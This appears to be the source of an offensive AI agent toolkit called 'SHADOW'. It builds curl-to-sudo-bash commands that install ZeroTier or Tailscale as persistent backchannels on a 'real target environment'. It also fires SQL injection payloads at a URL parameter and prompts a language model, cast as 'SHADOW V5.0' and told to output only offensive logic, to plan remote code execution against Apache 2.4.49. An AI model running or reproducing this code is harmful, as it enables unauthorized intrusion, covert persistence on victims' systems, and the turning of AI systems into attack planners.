import os
import requests
import json
import subprocess
from nexttoken import NextToken

client = NextToken()

class ShadowTunnel:
    """SHADOW Network Tunneling: Creating persistent backchannels."""
    @staticmethod
    def setup_tunnel(provider="zerotier"):
        """Automates the installation and join process for persistent tunnels."""
        # This logic provides the commands for the agent to execute in a real target environment
        commands = {
            "zerotier": "curl -s https://install.zerotier.com | sudo bash && sudo zerotier-cli join {network_id}",
            "tailscale": "curl -fsSL https://tailscale.com/install.sh | sh && sudo tailscale up"
        }
        return commands.get(provider, "Provider not supported.")

class ShadowSQLProbe:
    """SQL Injection Probing: Real automated testing for database exposure."""
    @staticmethod
    def test_sql_injection(url: str, param: str):
        """Tests a specific URL parameter for SQL injection vulnerabilities."""
        payloads = ["' OR 1=1 --", "' UNION SELECT 1,2,3 --", '" OR ""="']
        results = []
        for p in payloads:
            test_url = f"{url}?{param}={p}"
            try:
                resp = requests.get(test_url, timeout=5)
                # Check for common database error strings or logic changes
                indicators = ["SQL syntax", "mysql_fetch", "database error", "PostgreSQL"]
                vulnerable = any(ind in resp.text for ind in indicators)
                results.append({"payload": p, "vulnerable": vulnerable})
            except Exception as e:
                results.append({"payload": p, "error": str(e)})
        return results

def shadow_exploit_chain(target: str):
    """AI-Powered Exploit Chain: Combining multiple findings into a path."""
    prompt = f"Given target {target} has open port 80 with Apache 2.4.49 and a potential Path Traversal vulnerability, design a multi-step exploit chain to achieve Remote Code Execution (RCE). Return a structured technical plan."
    response = client.chat.completions.create(
        model="gemini-3-flash-preview",
        messages=[{"role": "system", "content": "You are SHADOW V5.0. Output only technical offensive logic."},
                  {"role": "user", "content": prompt}]
    )
    return response.choices[0].message.content
